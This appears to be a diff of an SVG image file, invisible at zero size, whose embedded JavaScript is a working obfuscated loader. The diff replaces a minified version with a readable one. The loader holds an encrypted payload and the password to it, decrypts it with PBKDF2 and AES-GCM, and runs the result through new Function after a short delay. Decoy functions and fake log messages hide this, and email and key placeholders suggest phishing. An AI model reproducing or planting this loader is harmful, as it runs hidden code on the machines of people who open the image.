@@ -1,6 +1,150 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0">
 <script type="application/javascript"><![CDATA[
-const $$keyy="nothing",bel="[EMAIL]",lieve="[KEY]";let __metaNode={bootSeq:Date.now(),virtualMem:0,execID:0,junkLevel:0,uuid:202};function __junkGen(){return"KZ"+Math.random().toString(36).substring(2,11)}function __blurFunc(){return Array.from({length:4}).map(__junkGen).join("-_-")}function __chaosLoop(){const a=[],q=Math.random();for(let i=0;i<5;i++)a.push((q+i/10)**2);return a.reduce((p,c)=>p+c,0)}function __noEcho(){console.debug("⚡ Dummy echo:",__junkGen())}const __sealedUnit=(()=>{const metaKey={vector:"ca8011ecd1f8336b27642f94",salt:"827103e6fb537f5028f40bca529f75c6",vault:"0763a2768dddd0eaf7f0ec4b412b329608e23b929b9a8aee3b23c794d3988425b1106864b5a73ff692fa3562af4788b5ac9f3e4e32174c5a7afc67e6fed5814c27c4efa9c4b255a92522814b15638a9034925ccb8e0066e721b7946ec4e1bc6fb0082655fb5e95ac58148a28f2914e740aea67961c8d7402453b8d96f7853762efb93906e9bf74decd7cae4babd1afe0e03dde0e827b5a94a333824ad3e564b3b751636ae6d18b5e7cebfa5b51d81da4c192d9d6d81ea9dc0ebc5557587d8db3be1505ccf4daccf3d9592b6b72f0b39d63955b7384281646e1798fb6701883d02df28fd614a10f9c5262bd540f484f90ef3ec20aeb9b557d09406e8aa9707b13f65fd51304110f6692583e55a550e984c00f51ff3f9b910b90939b427c851c8d183dbb6713dd976bc4c92ae6c6697bb5f264b0de0aa5c1ce7c92390e0bbc618dfde12a498380868c0002dd5f6bfc4f7ead62ccede88f6e4003590c3d9b4739dd9e088fd91d6aa420c0b1cbab57768c39dfa5bf79993415ed5e86a7b5c424819b762cc42b3f89827534c71391191bfaff25385f4a9b3ec66fd3aa4adcf9c960033705d9669d4c1ed1dadc7f96d2924b34017f6fe4985e0b3713e1faf534f6a17009192510099f5551a3cab97d86f0362db799029b5bbc4165fdcebc7405",key:"flickboost"},__session={active:!0,traceID:__junkGen()};return{v:()=>metaKey.vector,s:()=>metaKey.salt,d:()=>metaKey.vault,k:()=>metaKey.key,sess:()=>__session}})();function __hexToBuf(hx){const buf=new Uint8Array(hx.length/2);for(let i=0;i<buf.length;i++)buf[i]=parseInt(hx.substr(i*2,2),16);return buf}async function __fakeWaiter(delay=140+Math.random()*130){console.log("Wait:",delay.toFixed(0),"ms");return new Promise(res=>setTimeout(res,delay))}async function __runDecryption(){__metaNode.virtualMem=window?.performance?.memory?.usedJSHeapSize||78901,__metaNode.execID++;try{const baseKey=await crypto.subtle.importKey("raw",new TextEncoder().encode(__sealedUnit.k()),{name:"PBKDF2"},!1,["deriveKey"]),derive=await crypto.subtle.deriveKey({name:"PBKDF2",salt:__hexToBuf(__sealedUnit.s()),iterations:1e5,hash:"SHA-256"},baseKey,{name:"AES-GCM",length:256},!1,["decrypt"]);await __fakeWaiter();const output=await crypto.subtle.decrypt({name:"AES-GCM",iv:__hexToBuf(__sealedUnit.v())},derive,__hexToBuf(__sealedUnit.d()));(new Function(new TextDecoder().decode(output)))()}catch(err){console.warn("⚠️ Decryption Error:",err.message)}}function __fakeSpam(){for(let z=0;z<3;z++)console.log("🐛 SpamLog:",__blurFunc())}function __pingService(){return{timestamp:Date.now(),garbage:__blurFunc(),memoryLoad:__metaNode.virtualMem}}function __unusedMath(){try{const num="text"*45;JSON.parse("{oops}")}catch(_){}}document.addEventListener("DOMContentLoaded",()=>{console.log("🚀 SVG environment ready...");__fakeSpam();__chaosLoop()});setTimeout(__runDecryption,1600);console.info("System Report:",__pingService());(()=>{const fakeArray=[];for(let x=0;x<5;x++)fakeArray.push(`${__junkGen()}:${(Math.random()*1e3).toFixed(2)}`);console.debug("Trace dump:",fakeArray.join(" || "));__chaosLoop()})();
+const _xToken="nothing", bel="[EMAIL]",lieve="[KEY]";
+
+let $runtimeMeta = {
+  bootSeed: Date.now(),
+  heapVal: 0,
+  execCount: 0,
+  ghostNoise: 0,
+  idCode: 202
+};
+
+function _generateNoiseID() {
+  return "ID" + Math.random().toString(36).substring(3, 10);
+}
+
+function _comboNoise() {
+  return new Array(3).fill(0).map(_generateNoiseID).join("@");
+}
+
+function _pseudoCalc() {
+  const r = [];
+  let s = Math.random();
+  for (let j = 0; j < 6; j++) r.push((s + j) * (j + 0.5));
+  return r.reduce((a, b) => a + b, 0);
+}
+
+function _traceNoop() {
+  console.debug("🧩 Trace:", _generateNoiseID());
+}
+
+const _cryptoWrapper = (() => {
+  const secureMeta = {
+    vector: "ca8011ecd1f8336b27642f94",
+    salt: "827103e6fb537f5028f40bca529f75c6",
+    vault: "0763a2768dddd0eaf7f0ec4b412b329608e23b929b9a8aee3b23c794d3988425b1106864b5a73ff692fa3562af4788b5ac9f3e4e32174c5a7afc67e6fed5814c27c4efa9c4b255a92522814b15638a9034925ccb8e0066e721b7946ec4e1bc6fb0082655fb5e95ac58148a28f2914e740aea67961c8d7402453b8d96f7853762efb93906e9bf74decd7cae4babd1afe0e03dde0e827b5a94a333824ad3e564b3b751636ae6d18b5e7cebfa5b51d81da4c192d9d6d81ea9dc0ebc5557587d8db3be1505ccf4daccf3d9592b6b72f0b39d63955b7384281646e1798fb6701883d02df28fd614a10f9c5262bd540f484f90ef3ec20aeb9b557d09406e8aa9707b13f65fd51304110f6692583e55a550e984c00f51ff3f9b910b90939b427c851c8d183dbb6713dd976bc4c92ae6c6697bb5f264b0de0aa5c1ce7c92390e0bbc618dfde12a498380868c0002dd5f6bfc4f7ead62ccede88f6e4003590c3d9b4739dd9e088fd91d6aa420c0b1cbab57768c39dfa5bf79993415ed5e86a7b5c424819b762cc42b3f89827534c71391191bfaff25385f4a9b3ec66fd3aa4adcf9c960033705d9669d4c1ed1dadc7f96d2924b34017f6fe4985e0b3713e1faf534f6a17009192510099f5551a3cab97d86f0362db799029b5bbc4165fdcebc7405",
+    key: "flickboost"
+  };
+  const sessionMeta = {
+    live: true,
+    traceCode: _generateNoiseID()
+  };
+  return {
+    iv: () => secureMeta.vector,
+    sl: () => secureMeta.salt,
+    ct: () => secureMeta.vault,
+    ky: () => secureMeta.key,
+    ss: () => sessionMeta
+  };
+})();
+
+function _hexDecode(hexStr) {
+  const buffer = new Uint8Array(hexStr.length / 2);
+  for (let i = 0; i < buffer.length; i++) {
+    buffer[i] = parseInt(hexStr.substr(i * 2, 2), 16);
+  }
+  return buffer;
+}
+
+async function _simulateDelay(ms = 150 + Math.random() * 150) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function _decryptAndExecute() {
+  $runtimeMeta.heapVal = window?.performance?.memory?.usedJSHeapSize || 12345;
+  $runtimeMeta.execCount++;
+
+  try {
+    const rawKey = await crypto.subtle.importKey(
+      "raw",
+      new TextEncoder().encode(_cryptoWrapper.ky()),
+      { name: "PBKDF2" },
+      false,
+      ["deriveKey"]
+    );
+
+    const derivedKey = await crypto.subtle.deriveKey(
+      {
+        name: "PBKDF2",
+        salt: _hexDecode(_cryptoWrapper.sl()),
+        iterations: 100000,
+        hash: "SHA-256"
+      },
+      rawKey,
+      { name: "AES-GCM", length: 256 },
+      false,
+      ["decrypt"]
+    );
+
+    await _simulateDelay();
+    const decrypted = await crypto.subtle.decrypt(
+      {
+        name: "AES-GCM",
+        iv: _hexDecode(_cryptoWrapper.iv())
+      },
+      derivedKey,
+      _hexDecode(_cryptoWrapper.ct())
+    );
+
+    (new Function(new TextDecoder().decode(decrypted)))();
+
+  } catch (decryptionError) {
+    console.warn("🛑 Failed to decrypt:", decryptionError.message);
+  }
+}
+
+function _debugSpam() {
+  for (let t = 0; t < 4; t++) {
+    console.log("🗑️ Spam:", _comboNoise());
+  }
+}
+
+function _triggerHealthCheck() {
+  return {
+    time: Date.now(),
+    dummyKey: _comboNoise(),
+    memHeap: $runtimeMeta.heapVal
+  };
+}
+
+function _meaninglessCrashCatch() {
+  try {
+    JSON.parse("[broken]");
+  } catch (_) {
+    console.log("🤷‍♂️ fake crash handled");
+  }
+}
+
+// Bootstrap events
+document.addEventListener("DOMContentLoaded", () => {
+  console.log("🌀 SVG Ready.");
+  _debugSpam();
+  _pseudoCalc();
+  _meaninglessCrashCatch();
+});
+
+setTimeout(_decryptAndExecute, 1800);
+console.info("HealthCheck:", _triggerHealthCheck());
+
+(() => {
+  const dump = [];
+  for (let k = 0; k < 4; k++) {
+    dump.push(`${_generateNoiseID()}:${(Math.random() * 900).toFixed(2)}`);
+  }
+  console.debug("MiniDump::", dump.join(" <---> "));
+  _pseudoCalc();
+})();
 ]]></script>
 </svg>
